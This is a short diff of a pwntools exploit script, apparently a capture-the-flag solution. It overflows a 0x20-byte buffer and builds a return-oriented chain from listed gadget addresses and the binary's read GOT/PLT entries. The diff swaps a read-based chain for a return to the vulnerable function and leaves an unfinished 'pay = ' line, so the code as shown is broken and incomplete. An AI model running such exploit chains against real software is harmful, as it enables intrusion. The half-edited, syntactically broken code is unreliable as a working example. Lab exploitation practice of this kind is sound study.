@@ -38,7 +38,7 @@ else:
 # mov edx, 0x30 -> 0x401162
 # pop rsi -> 0x401059
 # mov eax, 0x0 -> 0x40109d
-# read, 0x404018, syscall = 0x404018 + 0x10
+# lea rsi, [rbp-0x20] -> 0x401167
 
 syscall = b''
 
@@ -47,13 +47,16 @@ slog("read@got", e.got["read"])
 
 pay = b'A'*0x20 # buf
 pay += b'b'*0x8
-pay += p64(0x40116b) # rdi 0
-pay += p64(0x401059) + p64(e.got["read"]) # rsi got
-pay += p64(e.plt["read"]) # read
+pay += p64(e.sym["vuln"])
+
+pause()
+
+pay = 
+
+# pause()
+# gdb.attach(p)
 
 p.send(pay)
 
-gdb.attach(p)
-pause()
 
 p.interactive()
